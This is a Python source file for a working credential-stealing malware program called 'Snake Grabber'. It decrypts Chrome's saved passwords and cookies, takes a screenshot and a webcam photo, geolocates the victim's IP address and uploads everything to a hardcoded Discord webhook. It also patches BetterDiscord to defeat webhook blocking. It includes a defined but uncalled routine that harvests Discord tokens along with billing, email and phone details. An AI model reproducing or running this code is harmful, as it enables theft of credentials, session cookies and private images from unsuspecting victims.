import subprocess
try:
    import requests
except:
    subprocess.Popen(["pip", "install", "requests"])
    import requests
import os 
import shutil 
import sqlite3 
import zipfile 
import json 
import base64 
try:
    import psutil 
except:
    subprocess.Popen(["pip", "install", "psutil"])
    import psutil
try:
    import pyautogui
except:
    subprocess.Popen(["pip", "install", "pyautogui"])
    import pyautogui
try:
    import cv2 as cv
except:
    subprocess.Popen(["pip", "install", "opencv-python"])
    import cv2 as cv
from os import name as os_name, system
try:
    from win32crypt import CryptUnprotectData
except:
    subprocess.Popen(["pip", "install", "pywin32"])
    from win32crypt import CryptUnprotectData
subprocess.Popen(["pip", "uninstall", "crypto"])
subprocess.Popen(["pip", "uninstall", "pycrypto"])
subprocess.Popen(["pip", "install", "pycrypto"])
from re import findall
from Crypto.Cipher import AES
clear = lambda: system('cls') if os_name == 'nt' else system('clear')
class Score_Main:
    def __init__(self):
        self.webhook = "https://discord.com/api/webhooks/954023084753584138/RFewgv20GIYjD9J2_Olm1gyEzVAcmFSNCb0IaAXcdcM1WL3xtDEUNApeLTsa8QZMbN0u" #Discord WebHook To Send All The Target Infos On
        self.files = ""
        self.appdata = os.getenv("localappdata")
        self.roaming = os.getenv("appdata")
        self.tempfolder = os.getenv("temp")+"\\magnouni"

        try:
            os.mkdir(os.path.join(self.tempfolder))
        except Exception:
            pass

        self.tokens = []
        self.saved = []

        if os.path.exists(os.getenv("appdata")+"\\BetterDiscord"):
            self.bypass_better_discord()

        if not os.path.exists(self.appdata+'\\Google'):
            self.files += f"**{os.getlogin()}** doesn't have google installed\n"
        else:
            self.grabPassword()
            self.grabCookies()
        self.screenshot()
        self.SendInfo()
        try:
            shutil.rmtree(self.tempfolder)
        except (PermissionError, FileExistsError):
            pass

    def getheaders(self, token=None, content_type="application/json"):
        headers = {
            "Content-Type": content_type,
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
        }
        if token:
            headers.update({"Authorization": token})
        return headers


    def bypass_better_discord(self):
        bd = os.getenv("appdata")+"\\BetterDiscord\\data\\betterdiscord.asar"
        with open(bd, "rt", encoding="cp437") as f:
            content = f.read()
            content2 = content.replace("api/webhooks", "magnouniDiscordHacked")
        with open(bd, 'w'): pass
        with open(bd, "wt", encoding="cp437") as f:
            f.write(content2)

    def get_master_key(self):
        with open(self.appdata+'\\Google\\Chrome\\User Data\\Local State', "r", encoding="utf-8") as f:
            local_state = f.read()
        local_state = json.loads(local_state)

        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key
    
    def decrypt_payload(self, cipher, payload):
        return cipher.decrypt(payload)
    
    def generate_cipher(self, aes_key, iv):
        return AES.new(aes_key, AES.MODE_GCM, iv)
    
    def decrypt_password(self, buff, master_key):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = self.generate_cipher(master_key, iv)
            decrypted_pass = self.decrypt_payload(cipher, payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except:
            return "Chrome < 80"
    
    def grabPassword(self):
        master_key = self.get_master_key()
        f = open(self.tempfolder+"\\Google Passwords.txt", "w", encoding="cp437", errors='ignore')
        f.write("FOR KGB USE ONLY")
        login_db = self.appdata+'\\Google\\Chrome\\User Data\\default\\Login Data'
        try:
            shutil.copy2(login_db, "Loginvault.db")
        except FileNotFoundError:
            pass
        conn = sqlite3.connect("Loginvault.db")
        cursor = conn.cursor()
        try:
            cursor.execute("SELECT action_url, username_value, password_value FROM logins")
            for r in cursor.fetchall():
                url = r[0]
                username = r[1]
                encrypted_password = r[2]
                decrypted_password = self.decrypt_password(encrypted_password, master_key)
                if url != "":
                    f.write(f"Domain-sv: {url}\nUser: {username}\nPass: {decrypted_password}\n\n")
        except:
            pass
        f.close()
        cursor.close()
        conn.close()
        try:
            os.remove("Loginvault.db")
        except:
            pass

    def grabCookies(self):
        master_key = self.get_master_key()
        f = open(self.tempfolder+"\\Google Cookies.txt", "w", encoding="cp437", errors='ignore')
        f.write("FOR KGB USE ONLY")
        login_db = self.appdata+'\\Google\\Chrome\\User Data\\default\\Network\\cookies'
        try:
            shutil.copy2(login_db, "Loginvault.db")
        except FileNotFoundError:
            pass
        conn = sqlite3.connect("Loginvault.db")
        cursor = conn.cursor()
        try:
            cursor.execute("SELECT host_key, name, encrypted_value from cookies")
            for r in cursor.fetchall():
                Host = r[0]
                user = r[1]
                encrypted_cookie = r[2]
                decrypted_cookie = self.decrypt_password(encrypted_cookie, master_key)
                if Host != "":
                    f.write(f"The Host: {Host}\nUser: {user}\nCookie: {decrypted_cookie}\n\n")
        except:
            pass
        f.close()
        cursor.close()
        conn.close()
        try:
            os.remove("Loginvault.db")
        except:
            pass

    def grabTokens(self):
        f = open(self.tempfolder+"\\Magnouni-DiscordInfo.txt", "w", encoding="cp437", errors='ignore')
        f.write("Made by magnouni | https://github.com/magnouni\n\n")
        paths = {
            'Discord': self.roaming + r'\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': self.roaming + r'\\discordcanary\\Local Storage\\leveldb\\',
            'Lightcord': self.roaming + r'\\Lightcord\\Local Storage\\leveldb\\',
            'Discord PTB': self.roaming + r'\\discordptb\\Local Storage\\leveldb\\',
            'Opera': self.roaming + r'\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
            'Opera GX': self.roaming + r'\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
            'Amigo': self.appdata + r'\\Amigo\\User Data\\Local Storage\\leveldb\\',
            'Torch': self.appdata + r'\\Torch\\User Data\\Local Storage\\leveldb\\',
            'Kometa': self.appdata + r'\\Kometa\\User Data\\Local Storage\\leveldb\\',
            'Orbitum': self.appdata + r'\\Orbitum\\User Data\\Local Storage\\leveldb\\',
            'CentBrowser': self.appdata + r'\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
            '7Star': self.appdata + r'\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
            'Sputnik': self.appdata + r'\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
            'Vivaldi': self.appdata + r'\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome SxS': self.appdata + r'\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
            'Chrome': self.appdata + r'\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            'Epic Privacy Browser': self.appdata + r'\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
            'Microsoft Edge': self.appdata + r'\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\',
            'Uran': self.appdata + r'\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
            'Yandex': self.appdata + r'\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Brave': self.appdata + r'\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Iridium': self.appdata + r'\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
        }

        for source, path in paths.items():
            if not os.path.exists(path):
                continue
            for file_name in os.listdir(path):
                if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                    continue
                for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                    for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                        for token in findall(regex, line):
                            self.tokens.append(token)
        for token in self.tokens:
            r = requests.get("https://discord.com/api/v9/users/@me", headers=self.getheaders(token))
            if r.status_code == 200:
                if token in self.saved:
                    continue
                self.saved.append(token)
                j = requests.get("https://discord.com/api/v9/users/@me", headers=self.getheaders(token)).json()
                badges = ""
                flags = j['flags']
                if (flags == 1):
                    badges += "Staff, "
                if (flags == 2):
                    badges += "Partner, "
                if (flags == 4):
                    badges += "Hypesquad Event, "
                if (flags == 8):
                    badges += "Green Bughunter, "
                if (flags == 64):
                    badges += "Hypesquad Bravery, "
                if (flags == 128):
                    badges += "HypeSquad Brillance, "
                if (flags == 256):
                    badges += "HypeSquad Balance, "
                if (flags == 512):
                    badges += "Early Supporter, "
                if (flags == 16384):
                    badges += "Gold BugHunter, "
                if (flags == 131072):
                    badges += "Verified Bot Developer, "
                if (badges == ""):
                    badges = "None"

                user = j["username"] + "#" + str(j["discriminator"])
                email = j["email"]
                phone = j["phone"] if j["phone"] else "No Phone Number attached"

                url = f'https://cdn.discordapp.com/avatars/{j["id"]}/{j["avatar"]}.gif'
                try:
                    requests.get(url)
                except:
                    url = url[:-4]

                nitro_data = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=self.getheaders(token)).json()
                has_nitro = False
                has_nitro = bool(len(nitro_data) > 0)

                billing = bool(len(json.loads(requests.get("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers=self.getheaders(token)).text)) > 0)
                
                f.write(f"{' '*17}{user}\n{'-'*50}\nTokens: {token}\nHas Billing: {billing}\n If The Server Nitro: {has_nitro}\nBadges: {badges}\nEmail: {email}\nPhone: {phone}\n[Avatar]({url})\n\n")
        f.close()

    def screenshot(self):
        image = pyautogui.screenshot()
        image.save(self.tempfolder + "\\Desktop-ScreenShot.png")
        cam = cv.VideoCapture(0)   
        s, img = cam.read()
        if s:
            path = f"{self.tempfolder}\\face.jpg"
            cv.imwrite(path, img)

    def SendInfo(self):
        ip = country = city = region = googlemap = "None"
        try:
            data = requests.get("http://ipinfo.io/json").json()
            ip = data['ip']
            city = data['city']
            country = data['country']
            region = data['region']
            googlemap = "https://www.google.com/maps/search/google+map++" + data['loc']
        except Exception:
            pass
        temp = os.path.join(self.tempfolder)
        new = os.path.join(self.appdata, f'Magnouni-[{os.getlogin()}].zip')
        self.zip(temp, new)
        for dirname, _, files in os.walk(self.tempfolder):
            for f in files:
                self.files += f"\n{f}"
        n = 0
        for r, d, files in os.walk(self.tempfolder):
            n+= len(files)
            self.fileCount = f"{n} Files Found: "
        embed = {
            "avatar_url":"https://c.tenor.com/pqckQpWm9DIAAAAC/typing-code.gif",
            "embeds": [
                {
                    "author": {
                        "name": "Snake Grabber",
                        "url": "https://google.com",
                        "icon_url": "https://c.tenor.com/lIMtjiAYuT8AAAAC/breezy-hacker.gif"
                    },
                    "description": f"**{os.getlogin()}** Hacked By Snake Grabber\n```fix\nComputerName: {os.getenv('COMPUTERNAME')}\nIP: {ip}\nCity: {city}\nRegion: {region}\nCountry: {country}```[Google Maps Location]({googlemap})\n```fix\n{self.fileCount}{self.files}```",
                    "color": 16119101,

                    "thumbnail": {
                      "url": "http://oi.pnlgames.ml/PNL.png"
                    },       

                    "footer": {
                      "text": " Edited by Xal Nar Lon'Arj Komtaree"
                    }
                }
            ]
        }
        requests.post(self.webhook, json=embed)
        requests.post(self.webhook, files={'upload_file': open(new,'rb')})

    def zip(self, src, dst):
        zipped_file = zipfile.ZipFile(dst, "w", zipfile.ZIP_DEFLATED)
        abs_src = os.path.abspath(src)
        for dirname, _, files in os.walk(src):
            for filename in files:
                absname = os.path.abspath(os.path.join(dirname, filename))
                arcname = absname[len(abs_src) + 1:]
                zipped_file.write(absname, arcname)
        zipped_file.close()
            
if __name__ == "__main__":
    Score_Main()